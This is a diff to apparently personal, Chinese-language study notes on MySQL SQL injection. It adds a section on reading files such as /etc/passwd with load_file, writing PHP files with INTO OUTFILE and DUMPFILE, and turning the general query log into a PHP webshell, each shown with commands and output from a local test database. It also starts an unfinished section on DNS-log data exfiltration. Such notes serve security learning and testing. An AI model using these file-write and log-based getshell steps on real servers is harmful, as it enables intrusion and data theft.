@@ -18,8 +18,8 @@
   - [order by注入](#order-by注入)
   - [limit注入](#limit注入)
   - [between and注入](#between-and注入)
-  - [dnslog外带数据](#dnslog外带数据)
   - [文件读写](#文件读写)
+  - [dnslog外带数据](#dnslog外带数据)
   - [宽字节注入](#宽字节注入)
   - [约束攻击](#约束攻击)
   - [无列名注入](#无列名注入)
@@ -1309,11 +1309,191 @@ mysql root@localhost:sql_injection_test> select * from table1 where id='-1' or i
 Time: 0.008s
 ```
 
-### dnslog外带数据
-
 ### 文件读写
 
+`file_priv`是表示用户的文件读写权限,查询方式`select file_priv,host,user from mysql.user`
+
+`secure_file_priv`表示mysql的读写权限,注意与`file_priv`区分
+
+查询方式
+
+```
+select @@secure_file_priv;
+select @@global.secure_file_priv;
+show variables like "secure_file_priv";
+```
+
+>注意区分空值和NULL
+
+- 空值即无限制
+- 为`NULL`表示禁止文件读写
+- 为目录名表示读写操作仅在该目录进行
+
+```
+mysql root@localhost:(none)> select @@version;
++-----------+
+| @@version |
++-----------+
+| 5.5.44    |
++-----------+
+1 row in set
+Time: 0.007s
+mysql root@localhost:(none)> select file_priv,host,user from mysql.user
++-----------+------+------+
+| file_priv | host | user |
++-----------+------+------+
+| Y         | %    | root |
++-----------+------+------+
+1 row in set
+Time: 0.010s
+mysql root@localhost:(none)> select @@secure_file_priv;
++--------------------+
+| @@secure_file_priv |
++--------------------+
+| <null>             |
++--------------------+
+1 row in set
+Time: 0.007s
+mysql root@localhost:(none)> select @@global.secure_file_priv;
++---------------------------+
+| @@global.secure_file_priv |
++---------------------------+
+| <null>                    |
++---------------------------+
+1 row in set
+Time: 0.011s
+mysql root@localhost:(none)> show variables like "secure_file_priv";
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+1 row in set
+Time: 0.012s
+```
+
+- 读文件
+
+`select load_file("/etc/passwd")`路径必须是绝对路径,同时要注意文件大小限制
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202021155836.png)
+
+>todo
+
+- 写文件
+
+`select "payload" into outfile/dumpfile 'filename'`路径必须是绝对路径
+
+```
+mysql root@localhost:mysql> select "<?php ?>" into outfile '/tmp/a.php';
+Query OK, 1 row affected
+Time: 0.001s
+mysql root@localhost:mysql> select load_file("/tmp/a.php")
++-------------------------+
+| load_file("/tmp/a.php") |
++-------------------------+
+| <?php ?>                |
+|                         |
++-------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:mysql> select "<?php ?>" into dumpfile '/tmp/b.php';
+Query OK, 1 row affected
+Time: 0.001s
+mysql root@localhost:mysql> select load_file("/tmp/b.php")
++-------------------------+
+| load_file("/tmp/b.php") |
++-------------------------+
+| <?php ?>                |
++-------------------------+
+1 row in set
+Time: 0.007s
+```
+
+可以通过日志文件进行getshell
+
+[slow_query_log_file](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_slow_query_log_file)
+
+[general_log_file](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_general_log_file)
+
+```
+mysql root@localhost:mysql> show variables like "%slow_query_log%";
++---------------------+--------------------------------------+
+| Variable_name       | Value                                |
++---------------------+--------------------------------------+
+| slow_query_log      | OFF                                  |
+| slow_query_log_file | /var/lib/mysql/04a8b4d57324-slow.log |
++---------------------+--------------------------------------+
+2 rows in set
+Time: 0.010s
+mysql root@localhost:mysql> show variables like "%general_log%";
++------------------+---------------------------------+
+| Variable_name    | Value                           |
++------------------+---------------------------------+
+| general_log      | OFF                             |
+| general_log_file | /var/lib/mysql/04a8b4d57324.log |
++------------------+---------------------------------+
+2 rows in set
+Time: 0.013s
+```
+
+```
+mysql root@localhost:(none)> show global variables like '%general%';
++------------------+---------------------------------+
+| Variable_name    | Value                           |
++------------------+---------------------------------+
+| general_log      | OFF                             |
+| general_log_file | /var/lib/mysql/f6b222ea5020.log |
++------------------+---------------------------------+
+2 rows in set
+Time: 0.011s
+mysql root@localhost:(none)> set global general_log_file="/tmp/log.php"
+Query OK, 0 rows affected
+Time: 0.001s
+mysql root@localhost:(none)> set global general_log=1
+Query OK, 0 rows affected
+Time: 0.002s
+mysql root@localhost:(none)> show global variables like '%general%';
++------------------+--------------+
+| Variable_name    | Value        |
++------------------+--------------+
+| general_log      | ON           |
+| general_log_file | /tmp/log.php |
++------------------+--------------+
+2 rows in set
+Time: 0.011s
+```
+
+```
+mysql root@localhost:mysql> select host from `user` union select "<?php phpinfo();?>"
++--------------------+
+| host               |
++--------------------+
+| %                  |
+| <?php phpinfo();?> |
++--------------------+
+2 rows in set
+Time: 0.008s
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202021353680.png)
+
+### dnslog外带数据
+
+只能够在windows上进行,利用了windows的[UNC](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths)
+
+|Path|Description|
+|:---:|:---:|
+|`\\system07\C$\`|The root directory of the C: drive on system07.|
+|`\\Server2\Share\Test\Foo.txt`|The Foo.txt file in the Test directory of the `\\Server2\Share volume`.|
+
+
+
 ### 宽字节注入
+
+
+
+
 
 ### 约束攻击
 
@@ -1600,6 +1780,6 @@ Time: 0.008s
 
 ### insert update delete注入
 
-
+与`select`不同,没有数据直接回显,通常结合报错注入或延时注入
 
 ## 未完待续...
